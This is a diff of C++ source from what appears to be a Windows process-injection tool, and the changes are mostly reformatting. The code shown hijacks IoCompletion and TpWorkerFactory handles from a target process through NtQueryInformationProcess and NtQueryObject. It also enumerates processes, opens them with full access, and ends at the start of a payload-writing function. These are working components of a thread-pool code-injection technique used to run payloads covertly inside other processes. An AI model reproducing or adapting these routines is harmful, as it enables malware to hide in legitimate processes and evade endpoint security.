@@ -3,19 +3,18 @@
 
 
 HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handleTypeName, _In_ uint32_t desiredAccess) {
-
-
-	fnNtQueryInformationProcess          pQueryProcInfo = nullptr;
-	fnNtQueryObject                      pQueryObject = nullptr;
-
-
 	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessSnapshotInfo = nullptr;
-	PPUBLIC_OBJECT_TYPE_INFORMATION      objectInfo = nullptr;
+	PPUBLIC_OBJECT_TYPE_INFORMATION objectInfo                = nullptr;
 
-	uint32_t totalHandles = NULL;		 uint32_t handleInfoSize = NULL;
-	NTSTATUS status = 0x00;			     HANDLE duplicatedHandle = NULL;
-	bool handleFound = false;		     uint32_t objectTypeReturnLen = NULL;
+	fnNtQueryInformationProcess pQueryProcInfo = nullptr;
+	fnNtQueryObject pQueryObject               = nullptr;
 
+	uint32_t totalHandles         = NULL;		 
+	uint32_t handleInfoSize       = NULL;
+	NTSTATUS status               = 0x00;			     
+	HANDLE duplicatedHandle       = NULL;
+	bool handleFound              = false;		     
+	uint32_t objectTypeReturnLen  = NULL;
 
 
 	//NtQueryInformationProcess
@@ -24,13 +23,10 @@ HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handle
 	//NtQueryObject
 	pQueryObject = reinterpret_cast<fnNtQueryObject>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryObject"));
 
-
 	if (pQueryProcInfo == nullptr || pQueryObject == nullptr) {
-
 		duplicatedHandle = INVALID_HANDLE_VALUE;
 		goto FUNC_END;
 	}
-
 
 
 	std::wcout << L"{+} Attempting to hijack handle of type: " << handleTypeName << std::endl;
@@ -42,9 +38,8 @@ HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handle
 		goto FUNC_END;
 	}
 
+	
 	handleInfoSize = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION) + ((totalHandles + 15) * sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO));
-
-
 
 	pProcessSnapshotInfo = static_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize));
 	if (pProcessSnapshotInfo == nullptr) {
@@ -53,7 +48,6 @@ HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handle
 		duplicatedHandle = INVALID_HANDLE_VALUE;
 		goto FUNC_END;
 	}
-
 
 	status = pQueryProcInfo(
 		targetProcess,
@@ -68,7 +62,6 @@ HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handle
 		duplicatedHandle = INVALID_HANDLE_VALUE;
 		goto FUNC_END;
 	}
-
 
 
 	for (size_t i = 0; i < pProcessSnapshotInfo->NumberOfHandles; i++) {
@@ -124,9 +117,7 @@ HANDLE hijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handle
 	}
 
 
-
 FUNC_END:
-
 	if (pProcessSnapshotInfo) {
 		HeapFree(GetProcessHeap(), 0, pProcessSnapshotInfo);
 	}
@@ -137,8 +128,6 @@ FUNC_END:
 
 	return duplicatedHandle;
 }
-
-
 
 // helpers
 HANDLE hijackProcessIoPort(HANDLE processHandle) {
@@ -153,18 +142,18 @@ HANDLE hijackProcessWorkerFactory(HANDLE processHandle) {
 	return hijackProcessHandle(processHandle, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
 }
 
-
-
 HANDLE enumerateProcess(_In_ wchar_t* processName, _Outptr_opt_ uint32_t* pPid) {
 
-	uint32_t PidArray[2048] = { 0 };		wchar_t moduleBaseName[250] = { 0 };
-	uint32_t sModulebaseName = 0;			uint32_t bytesReturned = 0;
-	uint32_t bytesNeeded = 0;			    uint32_t totalNumberOfPids = 0;
+	uint32_t PidArray[2048]     = { 0 };		
+	wchar_t moduleBaseName[250] = { 0 };
+	uint32_t sModulebaseName    = 0;			
+	uint32_t bytesReturned      = 0;
+	uint32_t bytesNeeded        = 0;			    
+	uint32_t totalNumberOfPids  = 0;
 
-	HANDLE hProcess = nullptr;
-	HMODULE hModule = nullptr;
+	HANDLE hProcess   = nullptr;
+	HMODULE hModule   = nullptr;
 	bool foundProcess = false;
-
 
 	if (!K32EnumProcesses((PDWORD)PidArray, sizeof(PidArray), (LPDWORD)&bytesReturned)) {
 		WIN32_ERR(K32EnumProcesses);
@@ -173,9 +162,7 @@ HANDLE enumerateProcess(_In_ wchar_t* processName, _Outptr_opt_ uint32_t* pPid) 
 
 	totalNumberOfPids = bytesReturned / sizeof(uint32_t);
 
-
 	for (size_t i = 0; i < totalNumberOfPids; i++) {
-
 		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PidArray[i]);
 		if (hProcess == NULL) {
 			continue;
@@ -200,11 +187,8 @@ HANDLE enumerateProcess(_In_ wchar_t* processName, _Outptr_opt_ uint32_t* pPid) 
 		memset(moduleBaseName, 0x00, sizeof(moduleBaseName));
 	}
 
-
 	return(foundProcess ? hProcess : INVALID_HANDLE_VALUE);
 }
-
-
 
 bool writePayloadIntoProcess(_In_ HANDLE hProcess, _In_ void* pPayload, _In_ size_t payloadSize, _Out_ void** pRemoteAddress) {
 
